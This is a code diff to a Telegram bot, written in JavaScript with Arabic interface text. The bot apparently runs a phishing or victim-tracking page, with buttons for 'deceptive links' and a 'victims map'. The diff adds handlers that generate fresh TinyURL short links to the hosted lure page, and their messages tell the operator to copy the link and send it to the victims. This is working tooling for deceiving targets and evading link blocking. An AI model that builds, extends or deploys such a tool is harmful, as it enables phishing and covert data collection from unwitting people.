@@ -131,8 +131,8 @@ function sendUserPageMain(chatId, uid, editMsgId) {
   const toggleLbl = cfg.active ? "⏸️ إيقاف الصفحة" : "▶️ تشغيل الصفحة";
   const kb = JSON.stringify({inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:`pgu_quick_${id}`},{text:"📋 السجل",callback_data:`pgu_log_${id}`}],
-    [{text:"🔗 روابط مخادعة",callback_data:`pgu_links_${id}`},{text:"🗑️ مسح البيانات",callback_data:`pgu_clear_${id}`}],
-    [{text:toggleLbl,callback_data:`pgu_toggle_${id}`}]
+    [{text:"🔗 روابط مخادعة",callback_data:`pgu_links_${id}`},{text:"🔄 تجديد الرابط",callback_data:`pgu_renew_${id}`}],
+    [{text:"🗑️ مسح البيانات",callback_data:`pgu_clear_${id}`},{text:toggleLbl,callback_data:`pgu_toggle_${id}`}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId,text,{parse_mode:"Markdown",reply_markup:kb});
@@ -147,7 +147,8 @@ function sendPageMain(chatId, editMsgId) {
     [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
     [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
-    [{text:toggleLabel,callback_data:"pg_toggle"},{text:"👁️ معاينة",callback_data:"pg_preview"}]
+    [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:"👁️ معاينة",callback_data:"pg_preview"}],
+    [{text:toggleLabel,callback_data:"pg_toggle"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -1523,6 +1524,19 @@ bot.on('callback_query', async (q) => {
     );
   }
 
+  if (data === "pg_renew") {
+    if (q.from.id !== BOT_OWNER) return;
+    bot.answerCallbackQuery(q.id, {text:"⏳ جاري توليد رابط جديد..."}).catch(()=>{});
+    const realLink = `${hostURL}/p`;
+    const short = await makeTinyUrl(realLink);
+    if (!short) return bot.sendMessage(chatId,"❌ فشل توليد الرابط، حاول مرة أخرى.");
+    return bot.sendMessage(chatId,
+      `🔄 *تم تجديد الرابط!*\n\n📋 الرابط الجديد:\n\`${short}\`\n\n⏰ تاريخ التجديد: ${new Date().toLocaleString('ar-SA')}\n\nانسخه وأرسله للضحايا 📤`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🔄 تجديد مرة أخرى",callback_data:"pg_renew"},{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})});
+  }
+
   if (data === "pg_qr") {
     if (q.from.id !== BOT_OWNER) return;
     const realLink = `${hostURL}/p`;
@@ -1789,6 +1803,20 @@ bot.on('callback_query', async (q) => {
     if (!short) return bot.sendMessage(chatId,"❌ فشل إنشاء الرابط القصير.");
     return bot.sendMessage(chatId,`📋 *الرابط القصير:*\n\n\`${short}\`\n\nانسخه وأرسله من أي تطبيق 📱`,
       {parse_mode:"Markdown"});
+  }
+
+  if (data.startsWith("pgu_renew_")) {
+    const uid = data.replace("pgu_renew_","");
+    if (String(chatId) !== uid) return;
+    bot.answerCallbackQuery(q.id,{text:"⏳ جاري توليد رابط جديد..."}).catch(()=>{});
+    const realLink = `${hostURL}/p/u/${uid}`;
+    const short = await makeTinyUrl(realLink);
+    if (!short) return bot.sendMessage(chatId,"❌ فشل توليد الرابط، حاول مرة أخرى.");
+    return bot.sendMessage(chatId,
+      `🔄 *تم تجديد رابطك!*\n\n📋 الرابط الجديد:\n\`${short}\`\n\n⏰ تاريخ التجديد: ${new Date().toLocaleString('ar-SA')}\n\nانسخه وأرسله 📤`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🔄 تجديد مرة أخرى",callback_data:`pgu_renew_${uid}`},{text:"🔙 رجوع",callback_data:`pgu_back_${uid}`}]
+      ]})});
   }
 
   if (data.startsWith("pgu_log_")) {
